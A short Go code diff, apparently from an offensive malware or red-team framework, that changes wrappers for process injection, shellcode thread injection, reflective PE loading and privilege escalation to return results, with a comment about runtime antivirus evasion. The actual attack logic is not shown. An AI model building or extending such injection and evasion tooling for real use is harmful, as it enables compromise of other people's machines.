@@ -211,21 +211,21 @@ func BoosterShot(url string) {
 }
 
 // Gets process, arguments and data to inject into a process
-func InjectIntoProc(proc, args, data string) {
-	shellcode.InjectIntoProcess(proc, args, data)
+func InjectIntoProc(proc, args, data string) bool {
+	return shellcode.InjectIntoProcess(proc, args, data)
 }
 
 // Escalates to Admin privileges for the provided file path (pass self to elevate running process)
-func Escalate(path string) {
-	escalate.Escalate(path)
+func Escalate(path string) string {
+	return escalate.Escalate(path)
 }
 
-func ReflectiveRunPE(destPE []byte) {
-	reflection.ReflectiveRunPE(destPE)
+func ReflectiveRunPE(destPE []byte) bool {
+	return reflection.ReflectiveRunPE(destPE)
 }
 
-func CreateThreadInject(data string) {
-	shellcode.CreateThreadInject(data)
+func CreateThreadInject(data string) bool {
+	return shellcode.CreateThreadInject(data)
 }
 
 // Should run on start. Starts processes for runtime AV evasion
